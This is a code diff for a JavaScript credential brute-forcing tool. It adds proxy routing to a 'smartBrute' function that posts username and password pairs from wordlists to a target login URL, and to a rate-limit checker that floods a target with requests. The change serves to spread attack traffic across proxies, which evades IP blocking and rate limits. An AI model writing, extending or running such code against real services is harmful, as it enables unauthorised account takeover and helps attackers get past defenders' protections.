@@ -32,17 +32,22 @@ async function saveResults(results) {
   }
 }
 
+// Load proxy support
+const proxySupport = require('./modules/proxy_support');
+
 // Smart Brute module
 async function smartBrute(config) {
-  const { targetUrl, usernames, passwords, delayMs, maxAttempts } = config.smartBrute;
+  const { targetUrl, usernames, passwords, delayMs, maxAttempts, useProxy } = config.smartBrute;
   const results = [];
   let attempts = 0;
+
+  const axiosInstance = useProxy ? proxySupport.createProxyAxios(config.proxy) : axios;
 
   for (const username of usernames) {
     for (const password of passwords) {
       if (attempts >= maxAttempts) break;
       try {
-        const response = await axios.post(targetUrl, { username, password }, { timeout: 5000 });
+        const response = await axiosInstance.post(targetUrl, { username, password }, { timeout: 5000 });
         results.push({
           operation: 'smart_brute',
           target: `${username}:${password}`,
@@ -93,13 +98,15 @@ function passwordGenerator(config) {
 
 // Rate Limit Checker module
 async function rateLimitChecker(config) {
-  const { targetUrl, maxRequests, intervalMs } = config.rateLimitChecker;
+  const { targetUrl, maxRequests, intervalMs, useProxy } = config.rateLimitChecker;
   const results = [];
   let blocked = false;
 
+  const axiosInstance = useProxy ? proxySupport.createProxyAxios(config.proxy) : axios;
+
   for (let i = 0; i < maxRequests; i++) {
     try {
-      const response = await axios.get(targetUrl, { timeout: 5000 });
+      const response = await axiosInstance.get(targetUrl, { timeout: 5000 });
       results.push({
         operation: 'rate_limit',
         target: targetUrl,
